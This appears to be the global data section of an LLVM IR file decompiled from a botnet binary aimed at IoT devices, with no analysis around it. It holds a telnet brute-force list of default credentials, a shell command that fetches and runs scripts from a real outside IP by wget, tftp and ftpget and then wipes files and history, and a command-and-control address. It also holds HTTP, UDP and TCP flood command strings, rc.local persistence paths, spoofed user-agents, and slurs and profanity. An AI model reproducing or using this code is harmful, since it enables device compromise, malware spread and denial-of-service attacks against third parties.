source_filename = "test"
target datalayout = "e-p:32:32:32-f80:32:32"

%_TYPEDEF_sigset_t = type { [1 x i32] }
%sockaddr = type { i32, [14 x i8] }
%timespec = type { i32, i32 }
%sigcontext = type { i32 }
%sigaction = type { void (i32)*, i32, void ()*, %_TYPEDEF_sigset_t }
%pollfd = type { i32, i16, i16 }

@r0 = internal unnamed_addr global i32 0
@r1 = internal unnamed_addr global i32 0
@r2 = internal unnamed_addr global i32 0
@r3 = internal unnamed_addr global i32 0
@r4 = internal unnamed_addr global i32 0
@r5 = internal unnamed_addr global i32 0
@r6 = internal unnamed_addr global i32 0
@r7 = internal unnamed_addr global i32 0
@r8 = internal unnamed_addr global i32 0
@sb = internal unnamed_addr global i32 0
@sl = internal unnamed_addr global i32 0
@fp = internal unnamed_addr global i32 0
@ip = internal unnamed_addr global i32 0
@sp = internal unnamed_addr global i32 0
@lr = internal unnamed_addr global i32 0
@cpsr_n = internal unnamed_addr global i1 false
@cpsr_z = internal unnamed_addr global i1 false
@cpsr_c = internal unnamed_addr global i1 false
@cpsr_v = internal unnamed_addr global i1 false
@0 = external global i32
@global_var_80a0.4 = constant i32 -352321502
@global_var_2300c.8 = global i32 0
@global_var_2301c.9 = global i32* @global_var_2300c.8
@global_var_23514.16 = global i32 0
@global_var_23010.19 = global i32 0
@global_var_e550.23 = constant i32 -509558771
@global_var_2354c.26 = global i32 0
@global_var_23550.27 = local_unnamed_addr global i32 0
@global_var_23554.28 = local_unnamed_addr global i32 0
@global_var_231a8.31 = local_unnamed_addr global i32 4095
@global_var_231a4.34 = global i32 362436
@global_var_19054.36 = constant [7 x i8] c"(null)\00"
@global_var_2754c.38 = local_unnamed_addr global i32 0
@global_var_1905c.40 = constant [8 x i8] c"/bin/sh\00"
@global_var_19064.42 = constant [3 x i8] c"sh\00"
@global_var_19068.44 = constant [3 x i8] c"-c\00"
@global_var_1906c.47 = constant i32 -1
@global_var_2352c.49 = global i32 0
@global_var_19044.51 = constant [8 x i8] c"busybox\00"
@global_var_1904c.52 = constant i32 36
@global_var_19050.53 = constant i32 35
@global_var_23168.54 = global [3 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_19044.51, i32 0, i32 0), i8* bitcast (i32* @global_var_1904c.52 to i8*), i8* bitcast (i32* @global_var_19050.53 to i8*)]
@global_var_1900c.56 = constant [7 x i8] c"nvalid\00"
@global_var_19014.57 = constant [6 x i8] c"ailed\00"
@global_var_1901c.58 = constant [9 x i8] c"ncorrect\00"
@global_var_19028.59 = constant [6 x i8] c"enied\00"
@global_var_19030.60 = constant [5 x i8] c"rror\00"
@global_var_19038.61 = constant [7 x i8] c"oodbye\00"
@global_var_19040.62 = constant [4 x i8] c"bad\00"
@global_var_23148.63 = global [7 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1900c.56, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_19014.57, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1901c.58, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_19028.59, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_19030.60, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_19038.61, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_19040.62, i32 0, i32 0)]
@global_var_23534.65 = global i32 0
@global_var_23538.66 = local_unnamed_addr global i32 0
@global_var_297b8.68 = global i32 0
@global_var_1946c.70 = constant [6 x i8] c":>%$#\00"
@global_var_19474.77 = constant [12 x i8] c"%d.%d.%d.%d\00"
@global_var_297ac.79 = global i32 0
@global_var_18f90.81 = constant [15 x i8] c"/dev/netslink/\00"
@global_var_18fa0.82 = constant [6 x i8] c"/tmp/\00"
@global_var_18fa8.83 = constant [6 x i8] c"/var/\00"
@global_var_18fb0.84 = constant [6 x i8] c"/dev/\00"
@global_var_18fb8.85 = constant [10 x i8] c"/var/run/\00"
@global_var_18fc4.86 = constant [10 x i8] c"/dev/shm/\00"
@global_var_18fd0.87 = constant [6 x i8] c"/mnt/\00"
@global_var_18fd8.88 = constant [7 x i8] c"/boot/\00"
@global_var_18fe0.89 = constant [6 x i8] c"/usr/\00"
@global_var_18fe8.90 = constant [6 x i8] c"/opt/\00"
@global_var_23108.91 = global [10 x i8*] [i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_18f90.81, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_18fa0.82, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_18fa8.83, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_18fb0.84, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_18fb8.85, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_18fc4.86, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_18fd0.87, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_18fd8.88, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_18fe0.89, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_18fe8.90, i32 0, i32 0)]
@global_var_23134 = external global i32
@global_var_18f44.98 = constant [7 x i8] c"telnet\00"
@global_var_18f4c.99 = constant [5 x i8] c"root\00"
@global_var_18f54.100 = constant [8 x i8] c"default\00"
@global_var_18f60.101 = constant [7 x i8] c"daemon\00"
@global_var_18f68.102 = constant [8 x i8] c"support\00"
@global_var_18f74.103 = constant i32 0
@global_var_18f78.104 = constant [7 x i8] c"123456\00"
@global_var_18f80.105 = constant [7 x i8] c"Zte521\00"
@global_var_18f88.106 = constant [6 x i8] c"vizxv\00"
@global_var_230bc.107 = global [18 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_18f44.98, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_18f4c.99, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_18f4c.99, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_18f4c.99, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_18f4c.99, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_18f4c.99, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_18f54.100, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_18f60.101, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_18f68.102, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_18f44.98, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_18f4c.99, i32 0, i32 0), i8* bitcast (i32* @global_var_18f74.103 to i8*), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_18f78.104, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_18f80.105, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_18f88.106, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_18f54.100, i32 0, i32 0), i8* bitcast (i32* @global_var_18f74.103 to i8*), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_18f68.102, i32 0, i32 0)]
@global_var_19480.109 = constant [3 x i8] c"\0D\0A\00"
@global_var_230e0.111 = global [9 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_18f44.98, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_18f4c.99, i32 0, i32 0), i8* bitcast (i32* @global_var_18f74.103 to i8*), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_18f78.104, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_18f80.105, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_18f88.106, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_18f54.100, i32 0, i32 0), i8* bitcast (i32* @global_var_18f74.103 to i8*), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_18f68.102, i32 0, i32 0)]
@global_var_23178.113 = global [10 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1900c.56, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_19014.57, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1901c.58, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_19028.59, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_19030.60, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_19038.61, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_19040.62, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_19044.51, i32 0, i32 0), i8* bitcast (i32* @global_var_1904c.52 to i8*), i8* bitcast (i32* @global_var_19050.53 to i8*)]
@global_var_19484.116 = constant i32 993090331
@global_var_194e4.118 = constant [5 x i8] c"sh\0D\0A\00"
@global_var_194ec.120 = constant [8 x i8] c"shell\0D\0A\00"
@global_var_18da4.122 = constant [415 x i8] c"cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://165.227.205.175/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 165.227.205.175 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 165.227.205.175; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 165.227.205.175 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *;history -c\0D\0A\00"
@global_var_230b8.123 = local_unnamed_addr global [415 x i8]* @global_var_18da4.122
@global_var_194f4.125 = constant [6 x i8] c"arfgG\00"
@global_var_194fc.126 = constant [9 x i8] c"HBiug655\00"
@global_var_19508.127 = constant [13 x i8] c"KJYDFyljf754\00"
@global_var_19518.128 = constant [20 x i8] c"LIKUGilkut769458905\00"
@global_var_1952c.129 = constant [17 x i8] c"JHFDSkgfc5747694\00"
@global_var_19540.130 = constant [12 x i8] c"GJjyur67458\00"
@global_var_1954c.131 = constant [12 x i8] c"RYSDk747586\00"
@global_var_19558.132 = constant [12 x i8] c"HKJGi5r8675\00"
@global_var_19564.133 = constant [10 x i8] c"KHGK7985i\00"
@global_var_19570.134 = constant [11 x i8] c"yuituiILYF\00"
@global_var_1957c.135 = constant [14 x i8] c"GKJDghfcjkgd4\00"
@global_var_1958c.136 = constant [12 x i8] c"uygtfgtrevf\00"
@global_var_19598.137 = constant [13 x i8] c"tyeuhygbtfvg\00"
@global_var_195a8.138 = constant [9 x i8] c"ewqdcftr\00"
@global_var_195b4.139 = constant [16 x i8] c"trbazetghhnbrty\00"
@global_var_195c4.140 = constant [11 x i8] c"tbhrwsehbg\00"
@global_var_195d0.141 = constant [12 x i8] c"twehgbferhb\00"
@global_var_195dc.142 = constant [12 x i8] c"etrbhhgetrb\00"
@global_var_195e8.143 = constant [14 x i8] c"edfverthbyrtb\00"
@global_var_195f8.144 = constant [14 x i8] c"kmiujmnhnhfgn\00"
@global_var_19608.145 = constant [14 x i8] c"zcdbvgdfsbgfd\00"
@global_var_19618.146 = constant [10 x i8] c"gdfbtsdgb\00"
@global_var_19624.147 = constant [14 x i8] c"ghdugffytsdyt\00"
@global_var_19634.148 = constant [14 x i8] c"tgerthgwtrwry\00"
@global_var_19644.149 = constant [12 x i8] c"yteytietyue\00"
@global_var_19650.150 = constant [9 x i8] c"qsortEQS\00"
@global_var_1965c.151 = constant [16 x i8] c"8969876hjkghblk\00"
@global_var_1966c.152 = constant [4 x i8] c"std\00"
@global_var_19670.153 = constant [4 x i8] c"dts\00"
@global_var_19674.154 = constant [4 x i8] c"lsk\00"
@global_var_19678.155 = constant [4 x i8] c"kek\00"
@global_var_1967c.156 = constant [6 x i8] c"smack\00"
@global_var_19684.157 = constant [4 x i8] c"ily\00"
@global_var_19688.158 = constant [4 x i8] c"tyf\00"
@global_var_1968c.159 = constant [4 x i8] c"pos\00"
@global_var_19690.160 = constant [6 x i8] c"cunts\00"
@global_var_19698.161 = constant [36 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_194f4.125, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_194fc.126, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_19508.127, i32 0, i32 0), i8* getelementptr inbounds ([20 x i8], [20 x i8]* @global_var_19518.128, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_1952c.129, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_19540.130, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1954c.131, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_19558.132, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_19564.133, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_19570.134, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1957c.135, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1958c.136, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_19598.137, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_195a8.138, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_195b4.139, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_195c4.140, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_195d0.141, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_195dc.142, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_195e8.143, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_195f8.144, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_19608.145, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_19618.146, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_19624.147, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_19634.148, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_19644.149, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_19650.150, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_1965c.151, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1966c.152, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_19670.153, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_19674.154, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_19678.155, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1967c.156, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_19684.157, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_19688.158, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1968c.159, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_19690.160, i32 0, i32 0)]
@global_var_180b0.163 = constant [64 x i8] c"Mozilla/4.0 (Compatible; MSIE 8.0; Windows NT 5.2; Trident/6.0)\00"
@global_var_180f0.164 = constant [65 x i8] c"Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)\00"
@global_var_18134.165 = constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; pl) Opera 11.00\00"
@global_var_18178.166 = constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; en) Opera 11.00\00"
@global_var_181bc.167 = constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; ja) Opera 11.00\00"
@global_var_18200.168 = constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; de) Opera 11.01\00"
@global_var_18244.169 = constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; fr) Opera 11.00\00"
@global_var_18288.170 = constant [110 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36\00"
@global_var_182f8.171 = constant [115 x i8] c"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36\00"
@global_var_1836c.172 = constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0\00"
@global_var_183b8.173 = constant [135 x i8] c"Mozilla/5.0 (iPhone; CPU iPhone OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H143 Safari/600.1.4\00"
@global_var_18440.174 = constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0\00"
@global_var_1848c.175 = constant [110 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36\00"
@global_var_184fc.176 = constant [109 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36\00"
@global_var_1856c.177 = constant [115 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11) AppleWebKit/601.1.56 (KHTML, like Gecko) Version/9.0 Safari/601.1.56\00"
@global_var_185e0.178 = constant [117 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/601.2.7 (KHTML, like Gecko) Version/9.0.1 Safari/601.2.7\00"
@global_var_18658.179 = constant [69 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko\00"
@global_var_186a0.180 = constant [47 x i8] c"Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)\00"
@global_var_186d0.181 = constant [63 x i8] c"Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51\00"
@global_var_18710.182 = constant [73 x i8] c"Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16\00"
@global_var_1875c.183 = constant [120 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A\00"
@global_var_187d4.184 = constant [111 x i8] c"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36\00"
@global_var_18844.185 = constant [109 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.94 Safari/537.36\00"
@global_var_188b4.186 = constant [115 x i8] c"Mozilla/5.0 (Linux; Android 4.4.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.89 Mobile Safari/537.36\00"
@global_var_18928.187 = constant [147 x i8] c"Mozilla/5.0 (Linux; Android 4.4.3; HTC_0PCV2 Build/KTU84L) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36\00"
@global_var_189bc.188 = constant [70 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; X11; Linux x86_64; pl) Opera 11.00\00"
@global_var_18a04.189 = constant [70 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows 98; .NET CLR 3.0.04506.30)\00"
@global_var_18a4c.190 = constant [64 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)\00"
@global_var_18a8c.191 = constant [123 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/4.0; GTB7.4; InfoPath.3; SV1; .NET CLR 3.4.53360; WOW64; en-US)\00"
@global_var_18b08.192 = constant [103 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; FDM; MSIECrawler; Media Center PC 5.0)\00"
@global_var_18b70.193 = constant [123 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 4.4.58799; WOW64; en-US)\00"
@global_var_18bec.194 = constant [80 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; FunWebProducts)\00"
@global_var_18c3c.195 = constant [82 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:25.0) Gecko/20100101 Firefox/25.0\00"
@global_var_18c90.196 = constant [82 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:21.0) Gecko/20100101 Firefox/21.0\00"
@global_var_18ce4.197 = constant [82 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:24.0) Gecko/20100101 Firefox/24.0\00"
@global_var_18d38.198 = constant [83 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0\00"
@global_var_18d8c.199 = constant [21 x i8] c"165.227.205.175:6767\00"
@global_var_23024.200 = global [37 x i8*] [i8* getelementptr inbounds ([64 x i8], [64 x i8]* @global_var_180b0.163, i32 0, i32 0), i8* getelementptr inbounds ([65 x i8], [65 x i8]* @global_var_180f0.164, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @global_var_18134.165, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @global_var_18178.166, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @global_var_181bc.167, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @global_var_18200.168, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @global_var_18244.169, i32 0, i32 0), i8* getelementptr inbounds ([110 x i8], [110 x i8]* @global_var_18288.170, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @global_var_182f8.171, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @global_var_1836c.172, i32 0, i32 0), i8* getelementptr inbounds ([135 x i8], [135 x i8]* @global_var_183b8.173, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @global_var_18440.174, i32 0, i32 0), i8* getelementptr inbounds ([110 x i8], [110 x i8]* @global_var_1848c.175, i32 0, i32 0), i8* getelementptr inbounds ([109 x i8], [109 x i8]* @global_var_184fc.176, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @global_var_1856c.177, i32 0, i32 0), i8* getelementptr inbounds ([117 x i8], [117 x i8]* @global_var_185e0.178, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @global_var_18658.179, i32 0, i32 0), i8* getelementptr inbounds ([47 x i8], [47 x i8]* @global_var_186a0.180, i32 0, i32 0), i8* getelementptr inbounds ([63 x i8], [63 x i8]* @global_var_186d0.181, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @global_var_18710.182, i32 0, i32 0), i8* getelementptr inbounds ([120 x i8], [120 x i8]* @global_var_1875c.183, i32 0, i32 0), i8* getelementptr inbounds ([111 x i8], [111 x i8]* @global_var_187d4.184, i32 0, i32 0), i8* getelementptr inbounds ([109 x i8], [109 x i8]* @global_var_18844.185, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @global_var_188b4.186, i32 0, i32 0), i8* getelementptr inbounds ([147 x i8], [147 x i8]* @global_var_18928.187, i32 0, i32 0), i8* getelementptr inbounds ([70 x i8], [70 x i8]* @global_var_189bc.188, i32 0, i32 0), i8* getelementptr inbounds ([70 x i8], [70 x i8]* @global_var_18a04.189, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @global_var_18a4c.190, i32 0, i32 0), i8* getelementptr inbounds ([123 x i8], [123 x i8]* @global_var_18a8c.191, i32 0, i32 0), i8* getelementptr inbounds ([103 x i8], [103 x i8]* @global_var_18b08.192, i32 0, i32 0), i8* getelementptr inbounds ([123 x i8], [123 x i8]* @global_var_18b70.193, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @global_var_18bec.194, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @global_var_18c3c.195, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @global_var_18c90.196, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @global_var_18ce4.197, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @global_var_18d38.198, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @global_var_18d8c.199, i32 0, i32 0)]
@global_var_19728.202 = constant [64 x i8] c"%s %s HTTP/1.1\0D\0AHost: %s\0D\0AUser-Agent: %s\0D\0AConnection: close\0D\0A\0D\0A\00"
@global_var_19768.204 = constant [4 x i8] c"all\00"
@global_var_1976c.206 = constant i32 44
@global_var_19770.208 = constant [4 x i8] c"syn\00"
@global_var_19774.210 = constant [4 x i8] c"rst\00"
@global_var_19778.212 = constant [4 x i8] c"fin\00"
@global_var_1977c.214 = constant [4 x i8] c"ack\00"
@global_var_19780.216 = constant [4 x i8] c"psh\00"
@global_var_19784.218 = constant [5 x i8] c"PING\00"
@global_var_1978c.220 = constant [6 x i8] c"PUSSY\00"
@global_var_19794.222 = constant [4 x i8] c"OFF\00"
@global_var_297b4.224 = global i32 0
@global_var_19798.226 = constant [3 x i8] c"ON\00"
@global_var_1979c.228 = constant [5 x i8] c"HTTP\00"
@global_var_197a4.231 = constant [38 x i8] c"HTTP %s Flooding %s:%d for %d seconds\00"
@global_var_197cc.233 = constant [4 x i8] c"UDP\00"
@global_var_197d0.236 = constant [4 x i8] c"TCP\00"
@global_var_197d4.238 = constant [4 x i8] c"STD\00"
@global_var_197d8.240 = constant [9 x i8] c"KILLATTK\00"
@global_var_23104.245 = local_unnamed_addr global i32 -1
@global_var_230b4.247 = global [21 x i8]* @global_var_18d8c.199
@global_var_197e4.249 = constant [8 x i8] c"8.8.8.8\00"
@global_var_197ec.252 = constant [16 x i8] c"/proc/net/route\00"
@global_var_197fc.254 = constant [11 x i8] c"\0900000000\09\00"
@global_var_2353c.256 = global i32 0
@global_var_19808.258 = constant [7 x i8] c"NIGGER\00"
@global_var_19810.260 = constant i32 0
@global_var_19814.262 = constant [19 x i8] c"/etc/rc.d/rc.local\00"
@1 = constant i32 114
@global_var_1982c.266 = constant [13 x i8] c"/etc/rc.conf\00"
@global_var_1983c.268 = constant i32 47
@global_var_19840.270 = constant [8 x i8] c"\22%s%s\22\0A\00"
@global_var_19848.272 = constant i32 97
@global_var_1984c.274 = constant [13 x i8] c"fork failed\0A\00"
@global_var_1985c.278 = constant i32 993090331
@global_var_198c0.283 = constant [9 x i8] c"LELIMDUP\00"
@global_var_198cc.285 = constant [20 x i8] c"PEACE OUT IMMA DUP\0A\00"
@global_var_198e0.287 = constant [11 x i8] c"STOLENBOTS\00"
@global_var_198ec.289 = constant [8 x i8] c"%s 2>&1\00"
@global_var_198f4.291 = constant i32 32
@global_var_29774.293 = global i32 0
@global_var_231b0 = external global i32
@global_var_231b8 = external local_unnamed_addr global i32
@global_var_29784.303 = global i32 0
@global_var_231ec.309 = global i32 0
@global_var_27550.311 = global i32 0
@global_var_126e8.313 = constant i32 -481296384
@global_var_fc0c.314 = constant i32 -442564544
@global_var_27554.316 = global i32 0
@global_var_23204.322 = global i32 2
@global_var_231d4.328 = global i32 0
@global_var_ffc4.329 = constant i32 -442564492
@global_var_231d0.331 = global i32* bitcast (i8** @global_var_23208.298 to i32*)
@global_var_19ef8.337 = constant i32 0
@global_var_10184.342 = constant i32 -382910448
@global_var_13d98.343 = constant i32 -382909968
@global_var_13e54.344 = constant i32 -382910224
@global_var_19f2c.346 = constant i32 135270416
@global_var_19f10.348 = constant [6 x i8] c"(nil)\00"
@global_var_19f18.351 = constant [7 x i8] c"(null)\00"
@global_var_19f20.353 = constant i32 2949163
@global_var_19fac.356 = constant i32 16843008
@global_var_19f94.358 = constant i32 327688
@global_var_19f8c.363 = constant [8 x i8] c" +0-#'I\00"
@global_var_19f34.365 = constant [9 x i8] c"hlLjztqZ\00"
@global_var_19f74.367 = constant [21 x i8] c"npxXoudifFeEgGaACScs\00"
@global_var_19f67.369 = constant i32 117506048
